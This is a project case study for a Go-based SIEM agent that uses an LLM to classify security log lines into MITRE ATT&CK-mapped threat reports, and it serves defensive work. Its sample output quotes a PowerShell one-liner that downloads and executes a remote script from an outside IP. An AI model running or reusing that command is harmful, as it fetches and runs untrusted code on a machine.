# Case Study: Go SIEM Agent — AI-Powered Security Event Classifier

**Author:** Chanchal S. Verma  
**GitHub:** [github.com/ChanchalS7/go-siem-agent-llm-classifier](https://github.com/ChanchalS7/go-siem-agent-llm-classifier)  
**Stack:** Go · React · Kimchi LLM · Qdrant · Ollama · PostgreSQL · Docker  
**Status:** Production-ready MVP — Phase 1 & 2 complete

---

## Executive Summary

Traditional SIEM tools generate hundreds of alerts daily, most of which are noise. Security analysts spend 60–70% of their time manually triaging low-fidelity alerts instead of investigating real threats. This project addresses that problem by building an AI-native SIEM agent that uses a Large Language Model (LLM) to instantly classify any raw log line into a structured threat report — with severity, MITRE ATT&CK mapping, IOC extraction, and actionable remediation — in under 20 seconds per event.

The system is fully self-contained: a Go backend, a vector database for semantic search, local embeddings via Ollama, and a responsive React dashboard — all orchestrated with Docker Compose.

---

## Problem Statement

Security Operations Centers (SOCs) face three compounding problems:

1. **Alert volume** — Modern infrastructure generates millions of log events daily. Existing rule-based SIEM tools (Splunk, Elastic SIEM) require manual signature writing to detect new attacks and produce a high false-positive rate.

2. **Context loss** — Raw log lines (`Failed password for root from 45.33.32.156 port 22`) contain all the information needed to identify a threat, but analysts must manually cross-reference MITRE ATT&CK, look up IPs on AbuseIPDB, write tickets, and determine remediation — all separately.

3. **Speed** — Mean time to detect (MTTD) in organizations without AI-assisted triage averages 197 days (IBM Cost of a Data Breach 2023). Even fast teams spend 10–30 minutes per alert on initial classification.

**Goal:** Build a system that turns any raw log line into a complete threat analysis in seconds, without manual signature writing or rule configuration.

---

## Solution Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                      React Dashboard :5173                       │
│   Classify input · Drop Zone · Event cards · Analytics charts   │
└───────────────────────────┬─────────────────────────────────────┘
                            │ HTTP / SSE (proxied)
┌───────────────────────────▼─────────────────────────────────────┐
│                   Go HTTP Server :8080                           │
│   Chi router · Rate limiter · CORS · Security headers           │
│                                                                  │
│  POST /api/classify       →  LLM classify single log line       │
│  POST /api/classify/stream → SSE token-by-token streaming       │
│  POST /api/ingest         →  Batch classify + store in Qdrant   │
│  GET  /api/search         →  Semantic vector search             │
│  GET  /api/analytics/summary → Charts & breakdown data          │
│  GET  /metrics            →  Prometheus observability           │
└───────┬─────────────────────────┬──────────────────────────────┘
        │                         │                    │
        ▼                         ▼                    ▼
 ┌─────────────┐         ┌──────────────┐     ┌──────────────┐
 │  Kimchi LLM │         │    Qdrant    │     │    Ollama    │
 │  minimax-m3 │         │  Vector DB   │     │ nomic-embed  │
 │ (via OpenAI │         │   :6334      │     │    :11434    │
 │  compat API)│         │ 768-dim vecs │     │  (local)     │
 └─────────────┘         └──────────────┘     └──────────────┘
```

### Key Design Decisions

| Decision | Rationale |
|---|---|
| **Go for backend** | Single binary, excellent concurrency for parallel log classification, simple deployment |
| **OpenAI-compatible API** | Vendor-neutral — swap Kimchi for OpenAI, Groq, Ollama, or any provider by changing two env vars |
| **Qdrant for vector search** | Purpose-built vector DB with gRPC API, filtering support, and Docker-friendly deployment |
| **Ollama for local embeddings** | Free, runs offline, keeps embeddings cost-zero and latency-low |
| **Chi router** | Lightweight, idiomatic Go middleware composition without framework overhead |
| **React + Vite** | Fast HMR dev loop; ships as static files embedded in Go binary for single-binary production deploy |

---

## Technical Implementation

### Phase 1 — Core Classification Engine

The heart of the system is the `Classifier` in [`internal/classifier/classifier.go`](siemagent/internal/classifier/classifier.go).

**LLM Prompt Engineering:**

Rather than fine-tuning a model, a carefully crafted system prompt instructs the LLM to act as an expert security analyst and return a strict JSON schema:

```
attack_type   → Human-readable threat category
tactic        → MITRE ATT&CK tactic (e.g. "Credential Access")
technique_id  → MITRE technique ID (e.g. "T1110.001")
technique     → Technique name (e.g. "Brute Force: Password Guessing")
severity      → P1 (Critical) → P5 (Informational)
confidence    → Float 0.0–1.0
iocs          → Extracted indicators (IPs, hashes, domains, usernames)
remediation   → Concrete 2-3 sentence action plan
summary       → One-sentence human-readable summary
```

The prompt encodes the full MITRE ATT&CK severity scale, triage logic, and IOC extraction rules — turning an unstructured log line into a fully structured threat report with no post-processing needed.

**Multi-format log parsing** (`internal/parser/`):
- RFC 5424 syslog (`<34>1 2024-01-15T10:30:00Z host app PID - message`)
- BSD syslog (`Jan 15 10:30:00 host app[pid]: message`)
- JSON structured logs
- Raw freeform text (fallback)

**Worker pool** (`internal/pipeline/`):

Batch ingestion uses a configurable concurrent worker pool to classify multiple log lines in parallel, maximising LLM throughput:

```go
pool := pipeline.NewWorkerPool(cfg.Workers, cls)  // default: 5 goroutines
results := pool.Start(context.Background())
for _, ev := range events { pool.Submit(ev) }
```

**In-memory ring buffer** (`internal/store/`):

A thread-safe ring buffer (`sync.RWMutex`) stores the last 1,000 classified events for the analytics and timeline endpoints, with O(1) writes and O(n) reads:

```go
type EventStore struct {
    mu     sync.RWMutex
    events [maxEvents]models.ClassifiedEvent
    head   int  // next write position (modulo 1000)
    count  int
}
```

**Streaming SSE** (`/api/classify/stream`):

The LLM response is streamed token-by-token via Server-Sent Events, giving the UI instant feedback while the model is still thinking — eliminating the perceived latency of a 15–20 second classification.

### Phase 2 — Semantic Search & RAG

**Vector indexing pipeline:**

Every classified event is embedded by Ollama (`nomic-embed-text`, 768 dimensions) and stored in Qdrant with the classification metadata as payload:

```
Log line → LLM classify → [attack_type, severity, summary] → Ollama embed → 768-dim vector → Qdrant upsert
```

**Semantic search:**

`GET /api/search?q=ssh+brute+force` embeds the query with Ollama and finds the nearest stored event vectors via cosine similarity. This enables natural-language threat hunting: *"show me events similar to lateral movement"* returns relevant past events even if they used different terminology.

**Similar events panel:**

Each classified event automatically queries Qdrant for the 5 most similar past events, surfacing patterns the analyst might otherwise miss — e.g., a new exfiltration attempt linked to a brute-force event from 30 minutes earlier.

### Frontend Architecture

The React dashboard ([`web/src/`](siemagent/web/src/)) is built around three principles:

1. **Real-time first** — Events appear immediately after classification; analytics auto-refresh every 30 seconds
2. **Responsive at every breakpoint** — Mobile (375px) gets hamburger sidebar + bottom-sheet detail panel; desktop (1280px+) gets the full three-column layout
3. **Zero configuration** — Vite proxies `/api` to `:8080` in dev; in production the Go binary embeds the built `dist/` via `//go:embed`

**IOC enrichment** — The `IOCList` component auto-detects IOC type (IPv4, IPv6, MD5/SHA1/SHA256 hash, domain) and links directly to VirusTotal or AbuseIPDB.

**Analytics panel** — Three live charts powered by Recharts:
- Attack type bar chart (color-coded by severity)
- Event rate timeline (6h, 10-min buckets, P1/P2/P3 lines)
- MITRE ATT&CK tactic donut chart

---

## Results & Metrics

| Metric | Value |
|---|---|
| **Classification latency** (p50) | ~15 seconds per log line |
| **Batch throughput** | ~5 events/min (5 parallel workers, LLM-bound) |
| **Log formats supported** | RFC 5424 syslog, BSD syslog, JSON, freeform |
| **MITRE techniques covered** | All 14 tactics, 40+ techniques via LLM reasoning |
| **Codebase** | ~3,000 lines Go + ~1,600 lines TypeScript |
| **Binary size** | Single ~12MB Go binary (with embedded frontend) |
| **Test coverage** | Unit + integration tests for classifier, parser, API, load |
| **Infrastructure** | 3 Docker containers (Qdrant, Postgres, Ollama) + Go binary |

### Sample Classification Output

**Input:**
```
Jan 15 10:34:00 workstation01 powershell[7890]: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.1/shell.ps1')
```

**Output (< 20s):**
```json
{
  "attack_type": "Malware Execution",
  "severity": "P2",
  "confidence": 0.95,
  "mitre": {
    "tactic": "Execution",
    "technique_id": "T1059.001",
    "technique": "Command and Scripting Interpreter: PowerShell"
  },
  "iocs": ["185.220.101.1", "shell.ps1"],
  "summary": "PowerShell on workstation01 downloaded and executed a remote script from a known Tor exit node IP.",
  "remediation": "Isolate workstation01 immediately. Block 185.220.101.1 at the firewall. Enable PowerShell Constrained Language Mode and AMSI logging across all endpoints."
}
```

---

## Challenges & Solutions

### Challenge 1: LLM Response Reliability
**Problem:** LLMs occasionally return malformed JSON, include markdown fences, or truncate the response.  
**Solution:** Built a `jsonBlockRE` regex extractor that strips markdown fences and extracts the JSON object from any surrounding text. Added fallback parsing and graceful degradation — malformed responses return a structured error, never a crash.

### Challenge 2: Streaming + Structured Output
**Problem:** SSE streaming and JSON extraction are fundamentally at odds — you can't parse JSON until the full response arrives.  
**Solution:** Streamed raw tokens to the UI for perceived immediacy, then extracted and parsed the complete JSON payload from the final assembled response before emitting the `done` event.

### Challenge 3: Qdrant gRPC in Go
**Problem:** The Qdrant Go client uses gRPC protobuf, not a simple REST client. Setting up the collection, creating keyword indexes, and querying with filters required non-trivial proto construction.  
**Solution:** Abstracted the raw gRPC client behind a clean `Store` interface with `EnsureCollection`, `Upsert`, and `Search` methods. The `APIStore` adapter translates between the internal `api.SearchResult` type and raw Qdrant protobuf hits, keeping the api package free of gRPC dependencies.

### Challenge 4: Kimchi API Base URL Discovery
**Problem:** The `.env.example` shipped with `KIMCHI_BASE_URL=https://api.kimchi.ai/v1` which doesn't exist. The actual endpoint is `https://llm.kimchi.dev/openai/v1`.  
**Solution:** Discovered the correct endpoint via HTML scraping and model enumeration. Updated `.env.example` and README with the correct URL and model names (`minimax-m3`, `kimi-k2.6`).

### Challenge 5: Responsive Layout with Three Panels
**Problem:** The dashboard has three panels (sidebar, event list, detail/analytics) — a layout that breaks completely on mobile.  
**Solution:** Built a breakpoint-adaptive layout:
- **Mobile:** Hamburger sidebar (offcanvas), tab bar switching between Events and Analytics, detail panel as a bottom-sheet drawer sliding up from the bottom
- **Tablet:** Collapsible sidebar, full event list, detail as modal overlay
- **Desktop (xl):** Full three-column static layout

---

## Future Phases (Roadmap)

### Phase 3 — Authentication & Multi-Tenancy
- **API key middleware** on all `/api/*` routes with key stored in `.env`
- **JWT-based auth** for multi-user support (analyst / admin / read-only roles)
- **Per-tenant isolation** in Qdrant collections and Postgres schemas
- **Move `/metrics`** to internal-only port (`:9090` bound to `127.0.0.1`)
- **Trusted proxy config** for `RealIP` middleware (CIDR allowlist)

### Phase 4 — Persistent Storage & Audit Trail
- **PostgreSQL integration** — persist all classified events to Postgres (schema already provisioned via Docker Compose)
- **Full audit log** — every classification stored with timestamp, source IP, user ID
- **Event deduplication** — hash-based dedup to avoid re-classifying identical log lines
- **Retention policy** — configurable TTL with auto-archival to S3/GCS

### Phase 5 — Real-time Log Ingestion Pipeline
- **Kafka / NATS consumer** — ingest directly from log streaming topics
- **Syslog UDP/TCP listener** — accept logs directly from rsyslog/syslog-ng (port 514)
- **Filebeat/Fluentd integration** — standard log shipping agent compatibility
- **Webhook ingestion** — accept POST from Cloudflare, AWS GuardDuty, Datadog, etc.

### Phase 6 — Advanced Analytics & Threat Correlation
- **Alert correlation engine** — group related events (e.g. brute force → successful login → lateral movement within 10 minutes) into a single incident
- **Threat timeline view** — visualize attack progression across hosts over time
- **Kill chain mapping** — automatically identify which phase of the MITRE ATT&CK kill chain an attacker is in
- **Anomaly detection** — baseline normal behaviour per host/user and flag deviations

### Phase 7 — Automated Response (SOAR)
- **Playbook engine** — trigger automated responses based on severity and attack type (e.g. P1 → auto-block IP via firewall API)
- **Integrations:** PagerDuty alerts, Slack notifications, Jira ticket creation, Firewall rule automation
- **Approval workflow** — human-in-the-loop confirmation for destructive actions (blocking IPs, killing processes)

### Phase 8 — Deployment & Scale
- **Single-binary production build** — `make build-all` embeds React frontend into Go binary (already working)
- **Helm chart** — Kubernetes deployment with autoscaling classifiers
- **Multi-LLM routing** — route cheap/simple logs to smaller models (e.g. `smollm2-360m`) and complex events to larger models to optimize cost
- **Grafana dashboard** — pre-built dashboard consuming the `/metrics` Prometheus endpoint

---

## Key Learnings

1. **LLM prompt design is an engineering discipline.** The quality of the classification output is almost entirely determined by the precision of the system prompt — severity scale definitions, IOC extraction rules, and output format constraints. Vague prompts produce vague results.

2. **Go's standard library is enough for serious production work.** The entire backend uses no ORM, no DI framework, no complex abstraction layers — just `net/http`, `log/slog`, `sync`, and a handful of well-chosen third-party packages.

3. **Vector search is the right abstraction for security correlation.** Exact-match search (Elasticsearch/Splunk) requires knowing what you're looking for. Semantic vector search finds *similar* events even when phrased differently — exactly what threat hunting requires.

4. **Streaming UX transforms perceived performance.** A 15-second blocking API call feels slow. The same 15-second operation streaming tokens in real-time feels fast. SSE implementation added ~50 lines of code and dramatically improved the user experience.

5. **Responsive design requires intentional panel strategy.** Three-panel layouts (sidebar + list + detail) are common in security tools but require deliberate breakpoint design — not just adding `md:` prefixes to Tailwind classes.

---

## Tech Stack Summary

| Category | Technology | Version |
|---|---|---|
| Backend language | Go | 1.25 |
| HTTP router | Chi | 5.3 |
| LLM client | go-openai (OpenAI-compat) | 1.41 |
| Vector DB | Qdrant (gRPC) | 1.18 |
| Local embeddings | Ollama — nomic-embed-text | 768-dim |
| Metrics | Prometheus client | 1.23 |
| Frontend | React + TypeScript | 19 + 5 |
| Build tool | Vite | 8.1 |
| Styling | Tailwind CSS | 3 |
| Charts | Recharts | 2 |
| HTTP client | Axios | 1.18 |
| State management | TanStack Query | 5 |
| Infrastructure | Docker Compose | — |
| LLM provider | Kimchi (minimax-m3) | — |

---

## Repository

**GitHub:** [github.com/ChanchalS7/go-siem-agent-llm-classifier](https://github.com/ChanchalS7/go-siem-agent-llm-classifier)

```bash
git clone https://github.com/ChanchalS7/go-siem-agent-llm-classifier.git
cd go-siem-agent-llm-classifier/siemagent
make setup && make docker-up && make pull-models && make serve
# Frontend: cd web && npm run dev
```

---

*Built as a learning project to explore LLM-native security tooling, vector search for threat intelligence, and production Go application architecture.*
